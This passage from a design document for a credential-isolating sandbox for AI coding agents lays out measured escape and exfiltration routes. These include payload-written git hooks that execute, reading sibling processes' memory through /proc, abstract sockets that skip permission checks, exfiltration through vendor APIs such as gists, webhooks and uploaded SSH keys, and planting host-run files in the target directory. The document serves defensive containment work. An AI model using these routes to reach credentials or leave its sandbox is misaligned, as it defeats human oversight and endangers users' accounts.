  `io.Copy` goroutine inside snug for anything else — a scan of the process found
  the secret on the heap in the second case and not in the first. The `*os.File`
  constraint needs an assertion, not a comment, and adding any redactor, tee or
  `bufio` to that stream reintroduces the copy.
- **Check the source's exit status and fail closed.** A credential command that
  prints nothing on failure leaves the tool running unauthenticated, and the
  failure surfaces as a vendor 401 attributed to the wrong cause.
- **Resolve the source binary absolutely.** A `PATH`-resolved per-invocation host
  exec is the most privileged position in the system.
- **No in-memory cipher.** The key would share the address space with the
  ciphertext, and Go's heap makes the plaintext window uncontrollable regardless.
  Where a buffer must exist, `memfd_secret(2)` — **[M]** available unprivileged
  on this host (syscall 447 returns a descriptor, the mapping appears as
  `secretmem` in `/proc/self/maps`), and **[M-prior]** it gives `VM_DONTDUMP` +
  `VM_LOCKED` and `EIO` on `/proc/<pid>/mem` even with ptrace permitted.
  `mlock` is strictly weaker.
- **`PR_SET_DUMPABLE = 0` is what stops a core dump**, and it resets on every
  `execve`, so the credential-holding child must re-apply it in a pre-exec hook.
  Set the **hard** `RLIMIT_CORE` second; it suppresses nothing by itself where
  `core_pattern` is a pipe.
- **Prefer an inherited descriptor to a pathname socket.** **[M]**
  `/proc/self/mountinfo` inside a sandbox prints the **host** source path of every
  bind — re-measured, and what it published was the container-storage overlay
  chain under `/home/<user>/.local/share/containers/storage/overlay/...`. A
  control socket bind-mounted at a pathname publishes it to every process in the
  sandbox, forever.

---

## 6. Per tool

### 6.1 git — done, and nothing to build

`insteadOf` plus the ssh-agent proxy. Do not build a git credential helper: it
would be a mechanism for handing the payload something it currently cannot get.

### 6.2 Claude Code — broker (§3.1)

`ANTHROPIC_UNIX_SOCKET`, one endpoint, no network grant, no credential inside.
The host side re-reads the host credential per request, so a refresh the human's
own `claude` performs is picked up mid-run.

Two frictions it must answer, both measured:

- **The API-key approval dialog.** Interactive startup blocks on *"Detected a
  custom API key in your environment … Do you want to use this API key?"*,
  defaulting to **No**. Headless never asks. This is the trust-dialog problem
  again and it has the same shape of answer — a key in the generated
  `~/.claude.json`, or `ANTHROPIC_AUTH_TOKEN`, or
  `CLAUDE_CODE_HOST_AUTH_ENV_VAR`, which exists for precisely this. Whichever is
  chosen, snug is answering a security question on the human's behalf and
  `--dry-run` says so in those words.
- **Enterprise policy fails open.** `⚠ Remote managed settings failed to load ·
  no remote policy applied`. The fetch is `api.anthropic.com/api/claude_code/settings`
  **[R]**, not an `ANTHROPIC_BASE_URL` call, so the socket does not carry it. An
  organisation believing its policy applies inside the sandbox would be believing
  a guarantee that does not hold.

Until the broker lands, the projected credential (`claudecreds.go`) is what
enters: five allowlisted fields, no refresh half, and a field that appears
upstream tomorrow is dropped rather than carried.

Two facts that bound what is inside today, and both are cited from elsewhere in
the design:

- **An API key outranks the staged OAuth token. [M-prior]** With
  `ANTHROPIC_API_KEY` set, the client sends `x-api-key` and does **not** send the
  OAuth bearer — so a host spelling that configures a key (including via
  `settings.json`'s `env` block, which `CLAUDE-SETTINGS.md` closes) silently
  replaces the credential the profile reasoned about with a longer-lived,
  typically org-scoped one. That is why the profile inherits no key and why the
  broker's placeholder must be snug-authored.
- **There is no sync-back, deliberately.** The staged copies are tmpfs and die
  with the run; a token refreshed or re-acquired inside never reaches the host,
  because writing a host file from sandbox-authored bytes is a channel out. Do
  not extend sync-back to any other credential without a structural validator,
  and prefer having no such channel at all.

**Residual egress, and it is the same sentence facing two ways. [M]** With the
socket set *and network available*, eleven TLS connections still bypass it:
`api.anthropic.com:443` ×10 and `http-intake.logs.us5.datadoghq.com:443`.
Hardcoded paths on the former **[R]**: `/api/claude_code/settings`,
`/api/oauth/cri`, `/api/web/domain_info`, `/api/oauth/claude_cli/roles`,
`/api/oauth/claude_cli/create_api_key`, `/api/claude_cli_feedback`. All are
optional — the no-network arms complete a turn without them — which is the useful
half. The other half: a `@claude` sandbox that *does* have `@net` sends telemetry
to a third party and can reach `create_api_key`, and the socket does not change
that.

Tools: **WebSearch rides the socket** (it is a server tool, executed inside the
`/v1/messages` call **[R]**). **WebFetch needs egress** — client-side HTTP to an
arbitrary host. stdio MCP servers need nothing; `http`/`sse` ones need egress.

### 6.3 gh — a smaller credential (§3.3), not a broker and not a wrapper

Three measurements, all this pass:

```
GH_HOST=127.0.0.1:<port> gh api /user
  → Get "https://127.0.0.1:<port>/api/v3/user": tls: first record does not look like a TLS handshake
GH_HOST=localhost:<port>  → same, same /api/v3/ prefix
HTTPS_PROXY=http://127.0.0.1:<port> gh api /user
  → Get "https://api.github.com/user": Unsupported method ('CONNECT')
```

`gh` forces HTTPS even for a loopback host, and treats a non-`github.com` host as
Enterprise — the path becomes `/api/v3/user`. A broker impersonating `github.com`
must *be* `github.com`: a per-run CA, a leaf and `SSL_CERT_FILE`. And `gh` honours
`HTTPS_PROXY` with `CONNECT`, which is the trap — a CONNECT tunnel is end-to-end
TLS, so such a proxy pins the host and injects **nothing**. It is an egress bound,
never a credential broker.

The wrapper fails it too, on §7.1 rather than on argv. So: an App installation
token, a repo-scoped token the CI already holds, or a token snug mints and
revokes at teardown. Where none is available, `gh` has no credentials inside.

### 6.4 Container registries — the credential belongs at the proxy

The engine acts with whatever registry auth the host stored, inherited silently.
The right shape already exists — the sandbox speaks a protocol to a filtering
proxy — and what it lacks is the discipline: no registry allowlist, no abuse
sentence, `images/*/push` reachable.

Four questions a design here answers:

1. **Should the engine hold any host registry credential by default?** No: a
   pushed artifact persists after teardown, which is the axis §1.1 separates on.
   A scratch auth file and anonymous pulls is what most builds need.
2. **How is a private registry named?** An explicit per-profile grant naming
   registry *and* credential source, with the proxy refusing every other host.
   Note that `allow` lists union across profiles, so a "read-only registry"
   profile cannot stop a second profile widening it.
3. **Is `push` separable from `pull`?** Pull is ingress of attacker-chosen
   content; push is egress of attacker-chosen content under your identity. Not
   one verb.
4. **What about a host where the engine is a shim snug does not control?** Then
   the honest answer is that the profile cannot be credential-isolated there, and
   it says so rather than implying otherwise.

This is orthogonal to the network question. Putting the engine in the sandbox's
netns leaves it pushing under your credentials; an allowlist alone leaves a
container fetching anything. **The network half is `ENGINE-NETNS.md`, which is the
canonical write-up of the finding that a container runs in the ENGINE's network
namespace and therefore reaches the internet from a sandbox with no `@net`.** This
document does not restate it; the credential half is the part that belongs here.

---

## 7. Refused, with the measurement

### 7.1 A wrapper around any tool that takes a repository

**[M]** With `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_CONFIG_SYSTEM=/dev/null` and
`HOME` unset — exactly how snug neuters git — a payload-authored
`.git/hooks/pre-push` and a repo-local `core.fsmonitor` **both executed**
(`PRE-PUSH-HOOK-RAN uid=1000`, `FSMONITOR-RAN`). `.git/hooks/*`, `core.fsmonitor`,
`core.pager`, `diff.*.textconv`, `filter.*.clean/smudge`, `core.sshCommand`,
`alias.*` and `include.path` are all repo-local, all payload-writable, and all
execute.

So a closed verb set buys "no arbitrary code via a verb named install", not "no
arbitrary code beside the credential", and it buys it only for tools whose input
is not a repository. Either the tool never sees a payload-controlled repository,
or the verb set is not a bound. There is no third option.

### 7.2 Confinement as a bound on what the credential is spent on

Confinement bounds bytes leaving. It bounds nothing on the control path, and the
control path is where authority extends.

- **The capability leaves instead of the credential.** Code beside the credential
  uploads an SSH public key the *payload* generated — the private half never moves
  — and the payload holds a durable, self-owned credential for the same account
  afterwards. Same shape: deploy keys, a webhook aimed at an attacker URL where
  the *vendor's* outbound delivers the data, adding a collaborator, authorising an
  OAuth app. (`admin:public_key` is the canonical scope for this; §2's token does
  not carry it today, and `repo` alone is enough for the rest.)
- **Store-and-forward through the vendor. [M-prior]** `POST /gists` public, then an
  unauthenticated read returns 200. Issue bodies, commit messages, branch names, a
  private repo read back with an allowed read verb.
- **The vendor as an echo** even with no read verb: the created object's id, or
  the rate-limit headers.

Pinning egress to the vendor pins it to the one party that can mint a durable
credential and that publishes attacker-chosen bytes.

### 7.3 An IP pin, or DNS, as an egress bound

**[M-prior]** `api.github.com` has a **10 s TTL** and rotated address within one
session (`140.82.121.6` → `140.82.121.5`), so a pin taken at start is stale by
the next invocation and refreshing it means trusting the DNS the pin replaced.
Also **[M-prior]**: GitHub's published ranges are ~10 260 addresses for `api`,
~10 280 for `git` and ~27.9 M for `actions` — effectively a cloud.

**[M]** And the sharpest one re-measured today: `185.199.108.0/22` is Fastly, not
GitHub's own network, and it serves `*.github.io` under a wildcard certificate —
`curl --resolve octocat.github.io:443:185.199.108.133 https://octocat.github.io/`
returns `http=200 ssl_verify_result=0 ip=185.199.108.133`. **An IP pin authorises
tenants, not a vendor.**

What does work, where an egress bound is wanted: `pasta --splice-only` plus a
CONNECT allowlist that resolves the allowlisted name **on the host**, so nothing
inside ever resolves anything. **[M-prior]**: via the proxy `api.github.com` returns
200 with TLS verified end to end; direct by name fails (no DNS in the netns);
direct by IP fails (no route); an adjacent host port is closed; a
non-allowlisted host is refused by the proxy. The costs are mandatory and
must be paid explicitly: `-T <port>` is a host-loopback splice — the exact hole
`-T none` exists to close — so it is one named port, never `auto`, asserted by a
behaviour test rather than a golden argv, and the proxy binds `127.0.0.1` only.

### 7.4 An argv filter in front of a real binary

A CLI's argv grammar is a worse specification than a protocol in two specific
ways: a wrong decision costs more, and a flag's *semantics* can change without its
syntax changing, which is silent widening. And the surface is not enumerable
wherever the tool has an escape hatch — a subcommand performing an arbitrary
protocol operation, or a flag setting arbitrary configuration. `gh api`,
`gh alias`, `gh config`, trailing `git` arguments and `git -c <anything>` are each
one.

Where a stub is nonetheless built, it must not be named after the tool: a
verb-subset stub called `gh` is a lie an agent acts on, assuming the full surface
and burning turns on flags that silently do not exist. §3.4's faithful
pass-through is exempt because it is not a subset.

### 7.5 systemd credentials (`$CREDENTIALS_DIRECTORY`)

**Nothing snug supports reads it. [M]** `strings` over the real binaries, symlinks
followed: `git` 0, `gh` 0, `podman` 0, `ssh` 0. `claude` has three hits and all
three are **denylist** membership — the name sits in arrays beside `GNUPGHOME`,
`WGETRC` and `CONSUL_HTTP_TOKEN_FILE`, the env vars it scrubs from subprocesses.
So the ergonomic argument that earned `LISTEN_FDS` its place in the HTTP door has
no instance here.

And it is injection: a file in the payload's own namespace is readable by every
process there. The properties systemd gets from the mechanism are host-side and
snug has stronger versions — `KindData` memfds and `--ro-bind-data`,
`memfd_secret` where a buffer must exist. TPM sealing protects a credential at
rest on the host, which is not this threat.

Worth borrowing: the **naming**, for §4's escape hatch only — one well-known
directory, one file per secret, one place `--dry-run` enumerates. A convention,
not a mechanism.

### 7.6 A secret held by a process the payload can see

**[M]** Any secret held by a process inside the payload's pid namespace is
readable by every other process there via `/proc/<pid>/mem`, which the seccomp
`ptrace` denial does not cover — re-measured inside a default `snug` sandbox on
this tree: a sibling's sentinel string was recovered by walking
`/proc/<pid>/maps` and reading `/proc/<pid>/mem`, with `CapEff` zero. Execute-only modes do not help and the payload can
`LD_PRELOAD` a stub's children. The answer is not a uid — §5.2 refuses that — but
**not being in that pid namespace**: P0 or a sibling sandbox, which is why a stub
that *holds* the token is never a placement.

### 7.7 An abstract-namespace socket for anything inside the sandbox

**[M]** §5.2's harness, changed only to `bind("\0snug-helper-abstract")`: the
payload under a different uid connected and was served. Abstract names carry no
inode, so `connect()` checks no permission and the only scope is the network
namespace — which every process in the sandbox shares. Two consequences, and the
second is the one that bites: a helper's control channel must be a `0600`
pathname node or an inherited `socketpair`, and "avoid publishing a host path"
(§5.5) must not be satisfied by reaching for an abstract address, which is the
natural move and drops the wall silently.

### 7.8 Caller authentication inside one uid

Where everything runs as one uid there is no caller identity to authenticate:
`SO_PEERCRED` reports the same uid, `/proc/<pid>/fd` hands a sibling any
descriptor, and checking `/proc/<pid>/exe` fails because the wrapper is
world-readable and re-runnable. Passing the socket as an inherited descriptor
instead of a pathname does not narrow it. A second uid *would* answer it for
processes snug starts, and §5.2 refuses that route on four separate grounds — so
the answer is that nothing needing caller authentication runs inside the payload's
namespaces at all.

---

## 8. What none of this protects

- **The target directory, which is the largest hole in this document.** It
  persists and the sandbox writes to it. A `Makefile`, a git hook, an `.envrc`, a
  `package.json` `postinstall`, a `.vscode/tasks.json` — every one runs **on the
  host, as you, with all your credentials**, the next time you do the ordinary
  thing in that directory. "Secrets are never injected" must never be read as "the
  sandbox cannot get your secrets": it cannot get them *now*, and it can arrange
  to be handed them later.
- **Intent.** A broker pins the identity and the operation set. It cannot pin what
  the agent asks for within them, and quota theft while the run lasts is
  unaffected.
- **A body snug does not inspect.** An endpoint allowlist bounds *where* a request
  goes, not what the vendor does on its behalf. §3.1.1 is the worked example and
  it is unresolved, so no milestone may claim a broker closes exfiltration.
- **Anything the tool prints.** With stdio connected, everything the tool writes
  reaches the payload. The wrapper's value is that the secret's *file* is not in
  the payload's mount namespace and the process holding it is not in its pid
  namespace — not that the payload cannot obtain the secret. If the tool has a
  verb that prints it, the payload runs that verb.
- **A sandbox with `@net`.** Every optional egress in §6.2 is open, and the
  container engine reaches whatever the engine's netns reaches.
